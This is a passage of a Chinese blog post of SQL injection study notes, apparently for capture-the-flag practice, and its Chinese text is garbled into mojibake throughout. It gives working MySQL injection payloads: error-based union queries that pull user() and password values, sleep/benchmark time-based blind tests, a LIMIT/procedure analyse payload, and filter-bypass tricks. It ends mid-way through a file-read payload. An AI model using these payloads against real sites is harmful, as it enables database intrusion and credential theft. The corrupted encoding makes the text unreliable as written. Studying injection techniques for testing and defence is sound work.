(ä¸ä¼šå¿½ç•¥åˆ—å€¼ä¸º NULL çš„è®°å½•)</strong></p>\n<p><strong>2ï¼Œcount (åˆ—å)</strong></p>\n<p><strong>è¿”å›åˆ—åæŒ‡å®šåˆ—çš„è®°å½•æ•°</strong></p>\n<p><strong>group by x  ä½œç”¨ä»¥ x ä¸ºä¸»é”®åˆ†ç»„</strong></p>\n<p><strong>ä¸»é”®ï¼ŒæŒ‡çš„æ˜¯ä¸€ä¸ªåˆ—æˆ–å¤šåˆ—çš„ç»„åˆï¼Œå…¶å€¼èƒ½å”¯ä¸€åœ°æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œ</strong></p>\n<p><strong>å…¶å®åœ¨åšçš„æ—¶å€™åˆ†ä¸ºä¸¤æ­¥é¦–å…ˆæ‰«æä¸€è¡Œä¸€è¡Œçš„æ‰«æä¸»é”®ï¼Œå¦‚æœè™šæ‹Ÿè¡¨ä¸­æœ‰å€¼åˆ™è·³è¿‡ï¼Œå¦‚æœæ²¡æœ‰ç¬¬äºŒæ­¥å°†å€¼æ”¾å…¥è™šè¡¨ä¸­</strong></p>\n<p>*<strong> é¦–å…ˆ rand () æ˜¯éšæœºç”Ÿæˆä¸€ä¸ª 0 åˆ° 1 ä¹‹é—´çš„éšæœºæ•° *</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003828506-513556717.png\" alt=\"img\" /></strong></p>\n<p><strong>ç„¶åä¸€èˆ¬åœ¨ floor ä¸­ä½¿ç”¨æ˜¯ä¼šä¹˜ä»¥ 2 æ—¢ floor (rand ()*2),floor çš„ä½œç”¨æ˜¯å¯¹æ•°å‘ä¸‹å–æ•´ï¼Œåˆ™æ•´ä¸ªè¯­å¥ä¼šå½¢æˆä¸€ä¸²ä¼ªéšæœº 011011....ã€‚</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003909146-1883988726.png\" alt=\"img\" /></strong></p>\n<p><strong>count (*) çš„æ•ˆæœ</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317005059387-2031388179.png\" alt=\"img\" /></strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317004937232-708877907.png\" alt=\"img\" /></strong></p>\n<p><strong>å¯¹äº select floor (rand (0)*2),count (*) from users group by floor (rand (0)*2); æŠ¥é”™</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131113712-1472090330.png\" alt=\"img\" /></strong></p>\n<p><strong>è¿‡ç¨‹è§£æ</strong></p>\n<p><strong>1ï¼Œgroup by æ—¶ï¼Œä¼šå»ºç«‹ç©ºè™šæ‹Ÿè¡¨å¦‚ä¸‹å›¾ï¼Œç„¶åä» sql è¯­å¥æ‰§è¡Œç»“æœåºåˆ—ï¼ˆ011011ï¼‰è¯»å–æ•°æ®å¹¶æ’å…¥è™šè¡¨:</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318130922453-1410766243.png\" alt=\"img\" /></strong></p>\n<p>2ï¼Œè™šè¡¨å†™å…¥ç¬¬ä¸€ä¸ªæ•°æ® (å‰ä¸€ä¸ª floor éƒ¨åˆ†è¿›è¡Œä¸€æ¬¡è®¡ç®—ï¼Œâ€œç¬¬ä¸€æ¬¡è®¡ç®—â€ï¼‰æ‰«æä¸»é”®ï¼Œå‘ç°æ²¡æœ‰ä¸ 0 å¯¹åº”çš„ä¸»å»ºï¼Œæ–°å»ºä¸»é”®ï¼ˆè¿™ä¸ªä¸»é”®çš„å€¼æ˜¯åé¢ä¸€ä¸ª floor éƒ¨åˆ†è¿›è¡Œä¸€æ¬¡è®¡ç®—çš„å€¼ï¼Œâ€œç¬¬äºŒæ¬¡è®¡ç®—â€ï¼‰å¦‚å›¾</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131856877-641578374.png\" alt=\"img\" /></p>\n<p>3ï¼Œå†™å…¥ç¬¬äºŒä¸ªæ•°æ®ï¼ˆå‰ä¸€ä¸ª floor éƒ¨åˆ†è®¡ç®—çš„å€¼ï¼Œâ€œç¬¬ä¸‰æ¬¡è®¡ç®—â€ï¼‰æœ‰å¯¹åº”çš„ä¸»é”® countï¼ˆ*ï¼‰åŠ ä¸€ï¼ˆè¿™é‡Œå°±æ²¡æœ‰å†è®¡ç®—åé¢çš„ floor éƒ¨åˆ†ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132321527-1779841079.png\" alt=\"img\" /></p>\n<p>4ï¼Œå†™å…¥ç¬¬ä¸‰ä¸ªæ•°æ®ï¼ˆå‰ä¸€ä¸ª floor è®¡ç®—çš„å€¼ï¼Œâ€œç¬¬å››æ¬¡è®¡ç®—â€ï¼‰æ‰«æä¸»é”®ï¼Œå‘ç°æ²¡æœ‰ä¸ 0 å¯¹åº”çš„ä¸»å»ºï¼ˆåˆšåˆšå»ºçš„ä¸»é”®è®°å½•çš„å€¼å®é™…ä¸º 1ï¼‰ï¼Œæ–°å»ºä¸»é”®ï¼ˆè¿™ä¸ªä¸»é”®çš„å€¼æ˜¯åé¢ä¸€ä¸ª floor éƒ¨åˆ†è¿›è¡Œä¸€æ¬¡è®¡ç®—çš„å€¼ï¼Œâ€œç¬¬äº”æ¬¡è®¡ç®—â€ï¼‰æ–°å»ºçš„ä¸»é”®å€¼åˆä¸º 1ï¼Œå› ä¸ºä¸»é”®ä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥æŠ¥é”™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132958429-1301912811.png\" alt=\"img\" /></p>\n<p>ç®€å•æ¥è¯´å°±æ˜¯ rand å’Œ group by çš„å†²çª</p>\n<p>æ¥ä¸‹æ¥æ˜¯ä¾‹å­</p>\n<p>') union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170034190-29499768.png\" alt=\"img\" /></p>\n<p>') union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170056710-97820973.png\" alt=\"img\" /></p>\n<h3 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h3>\n<p>exp () å‡½æ•°çš„æŠ¥é”™åŸç†æ˜¯æº¢å‡ºæŠ¥é”™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001005353035.png\" alt=\"image-20221001005353035\" /></p>\n<p>ä½¿ç”¨æ–¹æ³•å¦‚ä¸Šï¼Œè¿™ä¸ªåœ°æ–¹å¹¶æ²¡æœ‰æˆåŠŸï¼Œæš‚ä¸çŸ¥æ˜¯ä»€ä¹ˆåŸå› ï¼Œæœ‰å¾…è§£å†³</p>\n<h2 id=\"boolç›²æ³¨\"><a class=\"anchor\" href=\"#boolç›²æ³¨\">#</a> Bool ç›²æ³¨</h2>\n<p>ç›²æ³¨ä¸€èˆ¬ä½¿ç”¨åœ¨å¼€å‘è€…å°†æŠ¥é”™ä¿¡æ¯å±è”½æ—¶ä½¿ç”¨ï¼Œè™½ç„¶æŠ¥é”™ä¿¡æ¯è¢«å±è”½ï¼Œä½†æ˜¯é¡µé¢ä¼šæœ‰ä¸åŒçš„å›æ˜¾ï¼Œå¸¸ç”¨çš„æ–¹å¼æ˜¯åœ¨æ³¨å…¥ç‚¹åé¢åŠ ä¸Š and 1=1 æˆ–è€… and 1=2ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ç‚¹é‚£ä¹ˆ and 1=2 çš„æƒ…å†µä¸‹ï¼Œé¡µé¢ä¼šæœ‰æ‰€ä¸åŒï¼Œæœ‰äº›æ•™ç¨‹ä¼šæŠŠæŠ¥é”™æ³¨å…¥ä¹Ÿå½’ä¸ºç›²æ³¨çš„ä¸€ç§ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨å¸¸ç”¨çš„å‡½æ•°</p>\n<h3 id=\"å¸¸ç”¨å‡½æ•°\"><a class=\"anchor\" href=\"#å¸¸ç”¨å‡½æ•°\">#</a> å¸¸ç”¨å‡½æ•°</h3>\n<ol>\n<li>\n<p>æˆªå–å‡½æ•°</p>\n<ul>\n<li>\n<p>substr()</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">ç”¨æ³•ï¼šsubstr(string string,num start,num length);\n\nselect  substr(å‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3)  from  è¡¨å\n\nstringä¸ºå­—ç¬¦ä¸²ï¼›startä¸ºèµ·å§‹ä½ç½®ï¼›lengthä¸ºé•¿åº¦ã€‚\n\næ³¨æ„ï¼šmysqlä¸­çš„startæ˜¯ä»1å¼€å§‹çš„ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>left()</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">LEFT(str,length);\nSQL\nLEFT()å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼š\n\nstræ˜¯è¦æå–å­å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²ã€‚lengthæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼ŒæŒ‡å®šå°†ä»å·¦è¾¹è¿”å›çš„å­—ç¬¦æ•°ã€‚\nLEFT()å‡½æ•°è¿”å›strå­—ç¬¦ä¸²ä¸­æœ€å·¦è¾¹çš„é•¿åº¦å­—ç¬¦ã€‚å¦‚æœstræˆ–lengthå‚æ•°ä¸ºNULLï¼Œåˆ™è¿”å›NULLå€¼ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>right()</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">ã€å®ä¾‹ã€‘ä½¿ç”¨ RIGHT å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­å³è¾¹çš„å­—ç¬¦ï¼Œè¾“å…¥çš„ SQL è¯­å¥å’Œæ‰§è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤ºã€‚\nmysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);\n+------------------+\n| RIGHT(&#39;MySQL&#39;,3) |\n+------------------+\n| SQL              |\n+------------------+\n1 row in set (0.00 sec)\nç”±æ‰§è¡Œç»“æœå¯çŸ¥ï¼Œå‡½æ•°è¿”å›å­—ç¬¦ä¸²â€œMySQLâ€å³è¾¹å¼€å§‹çš„é•¿åº¦ä¸º3çš„å­å­—ç¬¦ä¸²ï¼Œç»“æœä¸ºâ€œSQLâ€ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n</ul>\n</li>\n<li>\n<p>è½¬æ¢å‡½æ•°</p>\n<ul>\n<li>\n<p>ascii()</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">è¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦å­—ç¬¦çš„æ•°å€¼ã€‚è¿”å›<span class=\"token number\">0</span>ï¼Œå¦‚æœsträ¸ºç©ºå­—ç¬¦ä¸²ã€‚è¿”å›<span class=\"token boolean\">NULL</span>ï¼Œå¦‚æœsträ¸º<span class=\"token boolean\">NULL</span>ã€‚ ASCII<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>è¿”å›æ•°å€¼æ˜¯ä»<span class=\"token number\">0</span>åˆ°<span class=\"token number\">255</span>ã€‚\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span>                                              <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">50</span>                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span>                                             <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">100</span>                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>hex()</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">å¦‚æœN_or_Sæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¿”å›Nï¼Œå…¶ä¸­Næ˜¯ä¸€ä¸ªé•¿é•¿<span class=\"token punctuation\">(</span><span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">)</span>æ•°å­—çš„åå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚è¿™ç­‰åŒäºCONV<span class=\"token punctuation\">(</span>Nï¼Œ<span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>ã€‚\n\n\tå¦‚æœN_or_Sæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›N_or_Såœ¨N_or_Sæ¯ä¸ªå­—ç¬¦è¢«è½¬åŒ–ä¸ºä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºã€‚\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> FF                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">0x616263</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">0x616263</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> abc                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n</ul>\n</li>\n<li>\n<p>æ¯”è¾ƒå‡½æ•°</p>\n<ul>\n<li>\n<p>if()</p>\n<p><strong>è¯­æ³•ç»“æ„ï¼š</strong></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">if(expr1,expr2,expr3)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¸Šè¿°è¯­æ³•ç»“æ„ä¸­ expr1 è¡¨ç¤ºçš„æ˜¯åˆ¤æ–­æ¡ä»¶ï¼Œexpr2 å’Œ expr3 æ˜¯ç¬¦åˆ expr1 çš„è‡ªå®šä¹‰çš„è¿”å›ç»“æœ</p>\n<p>å½“ expr1 çš„å€¼ä¸ºçœŸæ—¶ï¼Œåˆ™è¿”å›å€¼ä¸º expr2ï¼›å½“ expr1 çš„å€¼ä¸ºå‡æ—¶ï¼Œåˆ™è¿”å›å€¼ä¸º expr3</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"æ—¶é—´ç›²æ³¨\"><a class=\"anchor\" href=\"#æ—¶é—´ç›²æ³¨\">#</a> æ—¶é—´ç›²æ³¨</h2>\n<p>æ—¶é—´ç›²æ³¨å‡ºç°çš„åŸå› ä¹Ÿæ˜¯å› ä¸ºæœåŠ¡å™¨ç«¯æ‹¼æ¥äº†å¤±å»äº†è¯­å¥ä½†æ˜¯æ‰€æœ‰çš„å›æ˜¾éƒ½è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´åšä¸€ä¸ªåˆ¤æ–­ä½†æ˜¯ç”±äº sleep å’Œ benchmark å‡½æ•°çš„å¤§é‡æ‰§è¡Œä¼šä½¿å¾—æœåŠ¡å™¨çš„è´Ÿè½½é«˜ï¼Œå®¹æ˜“å¯¼è‡´é¢˜ç›®æŒ‚æ‰ã€‚</p>\n<p>åšé¢˜çš„æ–¹æ³•å’Œ bool ç›²æ³¨å·®ä¸å¤šï¼Œåˆ¤æ–­çš„æ–¹å¼ä¸åŒï¼Œä¸€èˆ¬æ—¶é—´ç›²æ³¨å¸¸ç”¨çš„æœ‰ä¸¤ä¸ªå‡½æ•° sleep å’Œ benchmark å‡½æ•°å¦‚ä¸‹è¡¨</p>\n<table>\n<thead>\n<tr>\n<th>å‡½æ•°å</th>\n<th>åŠŸèƒ½å’Œä½¿ç”¨æ–¹æ³•</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>sleep()</td>\n<td>sleep æ˜¯ç¡çœ å‡½æ•°ï¼Œå¯ä»¥ä½¿å¾—æŸ¥è¯¢æ•°æ®çš„æ—¶å€™å›æ˜¾æ•°æ®çš„å“åº”æ—¶é—´å»¶é•¿ï¼Œä½¿ç”¨æ–¹æ³• sleep (N) è¿™é‡Œ N æ˜¯å»¶é•¿çš„æ—¶é—´ï¼Œå¸¸é…åˆ if ä½¿ç”¨ï¼š&lt;br /&gt;if (ascll (subster (user (),1,1))=114,sleep (5),2)&lt;br /&gt; è¿™æ ·ç»•è¿‡ user çš„ç¬¬ä¸€ä½çš„ ascll ä¸º 114 åˆ™é¡µé¢è¿”å›æ—¶é—´å»¶è¿Ÿ 5 ç§’</td>\n</tr>\n<tr>\n<td>benchmark()</td>\n<td>benchmark å‡½æ•°åŸæœ¬æ˜¯ç”¨æ¥é‡å¤æ‰§è¡ŒæŸæ¡è¯­å¥çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æµ‹è¯•æ•°æ®åº“çš„è¯»å†™æ€§èƒ½ä½¿ç”¨æ–¹æ³•ï¼š&lt;br /&gt;benchmark (Nï¼Œexpression)&lt;br /&gt; å…¶ä¸­ N ä¸ºæ‰§è¡Œæ¬¡æ•°ï¼Œexpression ä¸ºè¡¨è¾¾å¼ã€‚å¦‚æœéœ€è¦è¿›è¡Œç›²æ³¨ï¼Œæˆ‘ä»¬é€šå¸¸é‡éœ€è¦è¿ç®—æ—¶é—´çš„è®¡ç®—é…åˆä½¿ç”¨æ¯”å¦‚ MD5</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"äºŒæ¬¡æ³¨å…¥-2\"><a class=\"anchor\" href=\"#äºŒæ¬¡æ³¨å…¥-2\">#</a> äºŒæ¬¡æ³¨å…¥</h2>\n<p>äºŒæ¬¡æ³¨å…¥çš„æˆå› æ˜¯ç¬¬ä¸€æ¬¡å…¥åº“æ—¶ç»è¿‡äº†ä¸€äº›è½¬ä¹‰ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“åä¼šå»é™¤è½¬ä¹‰ï¼Œå¯¼è‡´ç¬¬äºŒæ¬¡ä½¿ç”¨æ—¶æ¶æ„æ„é€  sql è¯­å¥</p>\n<h2 id=\"limitä¹‹åçš„æ³¨å…¥\"><a class=\"anchor\" href=\"#limitä¹‹åçš„æ³¨å…¥\">#</a> limit ä¹‹åçš„æ³¨å…¥</h2>\n<p>mysql æ•°æ®åº“ &gt; 5.0ã€mysql æ•°æ®åº“ &lt; 5.6.6 å¯ä»¥åœ¨ limit éƒ¨åˆ†è¿›è¡Œæ³¨å…¥</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">select field from table where id &gt; 0 order by id limit &#123;injection_point&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ payload è¿›è¡Œæ³¨å…¥ï¼š</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">select firld from user where id &gt; 0 order by id limit 1,1 procedure analyse(extractractvalue(rand(),concat(0x3a,version())),1);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"æ³¨å…¥ç‚¹çš„å‘ç°\"><a class=\"anchor\" href=\"#æ³¨å…¥ç‚¹çš„å‘ç°\">#</a> æ³¨å…¥ç‚¹çš„å‘ç°</h2>\n<h3 id=\"å¸¸è§çš„æ³¨å…¥ç‚¹\"><a class=\"anchor\" href=\"#å¸¸è§çš„æ³¨å…¥ç‚¹\">#</a> å¸¸è§çš„æ³¨å…¥ç‚¹</h3>\n<ol>\n<li>GET å‚æ•°</li>\n<li>POST å‚æ•°</li>\n<li>UA å¤´</li>\n<li>Cookie</li>\n</ol>\n<h3 id=\"åˆ¤æ–­æ³¨å…¥ç‚¹å­˜åœ¨\"><a class=\"anchor\" href=\"#åˆ¤æ–­æ³¨å…¥ç‚¹å­˜åœ¨\">#</a> åˆ¤æ–­æ³¨å…¥ç‚¹å­˜åœ¨</h3>\n<ol>\n<li>æ’å…¥å•å¼•å·</li>\n<li>æ•°å­—å‹åˆ¤æ–­</li>\n<li>é€šè¿‡æ•°å­—çš„åŠ å‡åˆ¤æ–­</li>\n</ol>\n<h2 id=\"ç»•è¿‡\"><a class=\"anchor\" href=\"#ç»•è¿‡\">#</a> ç»•è¿‡</h2>\n<h3 id=\"è¿‡æ»¤å…³é”®å­—\"><a class=\"anchor\" href=\"#è¿‡æ»¤å…³é”®å­—\">#</a> è¿‡æ»¤å…³é”®å­—</h3>\n<ol>\n<li>\n<p>å¤§å°å†™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001157452.png\" alt=\"image-20221008001157452\" /></p>\n</li>\n<li>\n<p>åŒå†™ï¼ˆæ›¿æ¢ä¸ºç©ºæ—¶ä½¿ç”¨ï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001212446.png\" alt=\"image-20221008001212446\" /></p>\n</li>\n<li>\n<p>16 è¿›åˆ¶ç»•è¿‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001254934.png\" alt=\"image-20221008001254934\" /></p>\n</li>\n<li>\n<p>url ç¼–ç ç»•è¿‡ï¼ˆå¿…è¦æ—¶å¯ä»¥é€šè¿‡åŒé‡ url ç¼–ç é¥¶è¿‡ï¼‰</p>\n</li>\n</ol>\n<h3 id=\"è¿‡æ»¤ç©ºæ ¼\"><a class=\"anchor\" href=\"#è¿‡æ»¤ç©ºæ ¼\">#</a> è¿‡æ»¤ç©ºæ ¼</h3>\n<ol>\n<li>é€šè¿‡æ³¨é‡Šç¬¦ç»•è¿‡\n<ul>\n<li>\n<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n</li>\n</ul>\n<hr />\n<ul>\n<li>//</li>\n<li>/**/</li>\n<li>;%00</li>\n</ul>\n</li>\n<li>url ç¼–ç ï¼ˆåŒé‡ï¼‰</li>\n<li>æ¢è¡Œç»•è¿‡</li>\n<li>ç‰¹æ®Šç¬¦å·ï¼ˆå¼•å·ï¼‰</li>\n</ol>\n<h3 id=\"è¿‡æ»¤å•å¼•å·\"><a class=\"anchor\" href=\"#è¿‡æ»¤å•å¼•å·\">#</a> è¿‡æ»¤å•å¼•å·</h3>\n<p>è¿™é‡Œæ˜¯æŒ‡é­”æœ¯å¼•å·ï¼Œå¯ä»¥é€šè¿‡å®½å­—èŠ‚ç»•è¿‡</p>\n<h2 id=\"sqlè¯»å†™æ–‡ä»¶\"><a class=\"anchor\" href=\"#sqlè¯»å†™æ–‡ä»¶\">#</a> sql è¯»å†™æ–‡ä»¶</h2>\n<p>åœ¨ mysql ç”¨æˆ·æ‹¥æœ‰ file æƒé™çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ load_file å’Œ into outfile/dumpfile è¿›è¡Œè¯»å†™</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">egï¼šæœ‰sqlè¯­å¥\nselect username from user id&#x3D;$id\næˆ‘ä»¬å¯ä»¥æ„å»ºåº¦æ–‡ä»¶\n?id&#x3D;-1 union select 